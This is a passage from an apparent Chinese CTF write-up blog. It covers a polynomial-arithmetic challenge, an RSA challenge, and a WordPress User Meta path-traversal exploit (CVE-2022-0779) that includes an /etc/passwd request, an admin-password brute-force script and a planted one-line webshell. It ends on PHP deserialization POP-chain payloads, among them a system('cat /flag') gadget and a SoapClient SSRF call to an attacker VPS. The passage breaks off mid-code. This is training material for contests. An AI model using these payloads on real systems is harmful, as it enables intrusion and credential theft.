<p>多项式乘法，已知<code>a(x)*b(x)+c(x)=r(x)</code>，<code>a(x),c(x),r(x)</code>求`b(x)</p>
</li>
</ul>
<p>题目与提供的代码稍有出入，服务器上跑的是可以看成在$GF(2^8)$下求<code>b(x)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sage: R.&lt;x&gt;=GF(<span class="number">8</span>)</span><br><span class="line">sage: a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">2</span></span><br><span class="line">....: c = x^<span class="number">6</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x + <span class="number">1</span></span><br><span class="line">....: r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">7</span> + x^<span class="number">2</span> + x + <span class="number">1</span></span><br><span class="line">sage: (r-c)/a</span><br><span class="line">x^<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>或者直接爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> poly2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;182.92.82.77&#x27;</span>, <span class="number">12469</span>)</span><br><span class="line">        self.r = <span class="number">0</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.c = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Poly2N</span>(<span class="params">self, f</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(f.replace(<span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;**&#x27;</span>).replace(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;2&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, a, c, pr</span>):</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            pa, pb, pc = [PP(<span class="built_in">bin</span>(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c]]</span><br><span class="line">            r = pa * pb + pc</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(r) == pr:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">int</span>(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_rac</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;r(x) = &#x27;</span>)</span><br><span class="line">            self.r = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            tmp = self.r</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;a(x) = &#x27;</span>)</span><br><span class="line">            self.a = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;c(x) = &#x27;</span>)</span><br><span class="line">            self.c = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            self.r = self.Poly2N(self.r)</span><br><span class="line">            self.a = self.Poly2N(self.a)</span><br><span class="line">            self.c = self.Poly2N(self.c)</span><br><span class="line">            b = self.check(self.a, self.c, tmp)</span><br><span class="line">            <span class="keyword">if</span> b:</span><br><span class="line">                self.sh.sendlineafter(<span class="string">b&#x27;&gt; b(x) = &#x27;</span>, <span class="built_in">str</span>(PP(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])).encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.solve_rac()</span><br><span class="line">        self.sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br><span class="line"><span class="comment"># flag&#123;f2887f56-0114-49c0-a0c6-663f164ef84a&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h4><ul>
<li><p>题目描述</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> falg</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> s:s + <span class="built_in">bytes</span>([(<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>]*((<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">n = getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">flag = pad(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) &gt;= <span class="number">48</span>)</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line"><span class="string">e = 3</span></span><br><span class="line"><span class="string">c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>4个因子，因为都是128位，yafu直接分解$\sqrt{n}$</p>
<p>跑到一半报错了（心态崩），看日志差不多一个小时的时间分解出来一个因子</p>
<p><img src="https://img-blog.csdnimg.cn/1f0e7c4234314af7884e51a136a61164.png" alt="image-20220730204034366"></p>
<p>之后重新下载了一个yafu就可以继续跑了</p>
<p><img src="https://img-blog.csdnimg.cn/0df9ba80ac344ad498a5ddbbd620dd6f.png" alt="image-20220730222756505"></p>
<p>最后$e=3$，$\varphi$有公因子9分别来自两个因子；由于$m$比较小，直接选用另外两个因子做模数就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">n1 = iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">r1, r2, r3, r4 = [<span class="number">225933944608558304529179430753170813347</span>, <span class="number">218566259296037866647273372633238739089</span>, <span class="number">223213222467584072959434495118689164399</span>, <span class="number">260594583349478633632570848336184053653</span>]</span><br><span class="line"></span><br><span class="line">phi = r3 * r4 * (r3 - <span class="number">1</span>) * (r4 - <span class="number">1</span>)</span><br><span class="line">new_n = (r3 * r4) ** <span class="number">2</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c, d, new_n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a>WP-UM</h4><ul>
<li><strong>CVE-2022-0779</strong></li>
</ul>
<p>因为存在meta-user插件，并且版本为2.4.3</p>
<p>payload:</p>
<p><a href="https://www.zilyun.com/23036.html">WordPress User Meta Lite Pro 2.4.3 Path遍历漏洞CVE-2022-0779-子云社区 (zilyun.com)</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php HTTP/1.1<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept: */*<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept-Language: en-GB,en;q=0.5<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept-Encoding: gzip, deflate<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">X-Requested-With: XMLHttpRequest<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Content-Length: 158<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Connection: close<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Cookie: [subscriber+]<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">field_name=test&amp;filepath=/../../../../../../../../etc/passwd&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=4286c1c56a&amp;is_ajax=true</span><br></pre></td></tr></table></figure>

<p>而给我们的目录中发现存在username和password目录，而通过题目的提示说明就是管理员的账户，那么直接利用这个cve爆破管理员密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdmin</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&lt;http://eci-2ze10x6989phb1g6riek.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            data = &#123;<span class="string">&#x27;field_name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;filepath&#x27;</span>: <span class="string">&#x27;/../../../../../../password/&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), x), <span class="string">&#x27;field_id&#x27;</span>: <span class="string">&#x27;um_field_4&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;form_key&#x27;</span>: <span class="string">&#x27;Upload&#x27;</span>, <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;um_show_uploaded_file&#x27;</span>, <span class="string">&#x27;pf_nonce&#x27;</span>: <span class="string">&#x27;ffe681c469&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;is_ajax&#x27;</span>: <span class="string">&#x27;true&#x27;</span>&#125;</span><br><span class="line">            cookie = &#123;&#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;umRemoveFile&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i)+x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">getAdmin()</span><br><span class="line"></span><br><span class="line"><span class="comment"># MaoGePaMao</span></span><br><span class="line"><span class="comment"># MaoGeYaoQiFeiLa</span></span><br></pre></td></tr></table></figure>

<p>直接登录，在插件那里存在插件文件编辑，直接在user-meta.php中写入一句话木马</p>
<p>直接访问首页，执行成功，flag在user目录下</p>
]]></content>
      <categories>
        <category>参加的各种比赛</category>
      </categories>
      <tags>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>集训学习记录Ⅰ</title>
    <url>/2022/07/02/%E9%9B%86%E8%AE%AD%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E2%85%A0/</url>
    <content><![CDATA[<blockquote>
<p>实验室暑假集训开始了，每天刷个了2、3、4题吧，学到的知识可能没有直接放在wp中，之后整理出来应该会令发一个</p>
</blockquote>
<span id="more"></span>

<h2 id="CISCN2019-Laravel1"><a href="#CISCN2019-Laravel1" class="headerlink" title="[CISCN2019]Laravel1"></a>[CISCN2019]Laravel1</h2><p>开幕indexController直接给了，还给了备份源码，那就直接审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="variable">$request</span>-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为反序列化之后对实例化的类并没有任何操作，所有只能倚靠原类的会自动执行的魔术方法来执行就比如<code>__destruct</code></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220620123403997.png" alt="image-20220620123403997"></p>
<p>找到可利用的<code>__destruct</code>：</p>
<ul>
<li>一些函数如<code>call_user_func|file_get_contents|include</code></li>
<li>可以触发其他魔术方法比如<code>toString|call|get|set|invoke</code></li>
<li>直接存在可操作的<code>$fun($args)</code>，其中函数和参数我们都可以操作</li>
<li>或者实例化了一个类可以触发原生类</li>
<li>……</li>
</ul>
<p>这里找到了<code>TagAwareAdapter::__destruct</code>，这里存在<code>$f($items)</code>直接利用啦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">    <span class="variable">$items</span> = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">            <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">    <span class="variable">$tagsByKey</span> = <span class="variable">$f</span>(<span class="variable">$items</span>); </span><br><span class="line">    <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$deferred</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$getTagsByKey</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getTagsByKey = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/7af57e6fd813438eadc61569f2681d17.png" alt="image-20220620124744055"></p>
<h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><h3 id="SoapClient-SSRF"><a href="#SoapClient-SSRF" class="headerlink" title="SoapClient SSRF"></a>SoapClient SSRF</h3><p>上一个简单的小栗子，（如果报错为未找到<code>SoapClient</code>类，那么请先到php.ini加上soap的拓展</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://vps:5656&#x27;</span>));</span><br><span class="line">    <span class="variable">$a</span>-&gt;function();</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f6193516b9a94ea8bcdc809659213663.png" alt="image-20220620145743286"></p>
<p>可以清楚地看到数据成功地显示在了我们自己的vps上</p>
<p>可以看一下这个类：</p>
<p>从注释中可以得到<code>location</code>和<code>uri</code>是必须设置的</p>
<p>其他的还有<code>soap_version|proxy_host|user_agent|stream_context|keep_alive|ssl_method</code>等</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">* @param <span class="keyword">array</span> <span class="variable">$options</span> [optional] &lt;p&gt;</span><br><span class="line">* An <span class="keyword">array</span> of options. <span class="keyword">If</span> working in WSDL mode, this parameter is optional.</span><br><span class="line">* <span class="keyword">If</span> working in non-WSDL mode, the location <span class="keyword">and</span></span><br><span class="line">* uri options must be set, where location</span><br><span class="line">* is the URL of the SOAP server to send the request to, <span class="keyword">and</span> uri</span><br><span class="line">* is the target <span class="keyword">namespace</span> <span class="title">of</span> <span class="title">the</span> <span class="title">SOAP</span> <span class="title">service</span>.</span><br><span class="line">* &lt;/<span class="title">p</span>&gt;</span><br><span class="line">* &lt;<span class="title">p</span>&gt;</span><br><span class="line">* <span class="title">The</span> <span class="title">style</span> <span class="title">and</span> <span class="title">use</span> <span class="title">options</span> <span class="title">only</span> <span class="title">work</span> <span class="title">in</span></span><br><span class="line">* <span class="title">non</span>-<span class="title">WSDL</span> <span class="title">mode</span>. <span class="title">In</span> <span class="title">WSDL</span> <span class="title">mode</span>, <span class="title">they</span> <span class="title">come</span> <span class="title">from</span> <span class="title">the</span> <span class="title">WSDL</span> <span class="title">file</span>.</span><br><span class="line">* &lt;/<span class="title">p</span>&gt;</span><br><span class="line">* &lt;<span class="title">p</span>&gt;</span><br><span class="line">* <span class="title">The</span> <span class="title">soap_version</span> <span class="title">option</span> <span class="title">should</span> <span class="title">be</span> <span class="title">one</span> <span class="title">of</span> <span class="title">either</span></span><br><span class="line">* &lt;<span class="title">b</span>&gt;<span class="title">SOAP_1_1</span>&lt;/<span class="title">b</span>&gt; <span class="title">or</span> &lt;<span class="title">b</span>&gt;<span class="title">SOAP_1_2</span>&lt;/<span class="title">b</span>&gt; <span class="title">to</span></span><br><span class="line">* <span class="title">select</span> <span class="title">SOAP</span> 1.1 <span class="title">or</span> 1.2, <span class="title">respectively</span>. <span class="title">If</span> <span class="title">omitted</span>, 1.1 <span class="title">is</span> <span class="title">used</span>.</span><br><span class="line">* &lt;/<span class="title">p</span>&gt;</span><br><span class="line">* ……</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>

<h3 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h3><p>首先弄下源码之后除了index.php之外，还有一个flag.php格外引人注目，并且要求访问来源地址为<code>127.0.0.1</code>然后将flag放入session</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以在<code>usr/plugins/HelloWorld</code>中发现我们可以利用的主要代码，我们就要发现如果这里通过任意方法请求<code>admin</code>，那么就会把session输出，而如果我们成功访问<code>flag.php</code>就可以得到在本页面得到flag了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;admin&#x27;</span>])) var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">   unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>那么现在首要的重点是，该怎么进去这个路由</p>
<p>在<code>var/Typecho/Plugin.php</code>中发现了该插件的路由</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么接下去就是找pop链了</p>
<p>首先可以先去找一下<code>__destruct</code>，但是发现只有两个类中存在这个魔术方法且没有一点用，所以得找别的路了</p>
<p>然后我们可以发现同个文件下还有一个<code>HelloWorld_DB</code>类，它存在<code>wakeup</code>方法，会在反序列化之前自动调用，实例化了<code>Typecho_Db</code>而且传入的参数是我们可控的，那么就可以先从这个入手</p>
<p><code>Typecho_Db::__construct</code>字符连接触发<code>toString</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>; <span class="comment">// 触发toString</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span 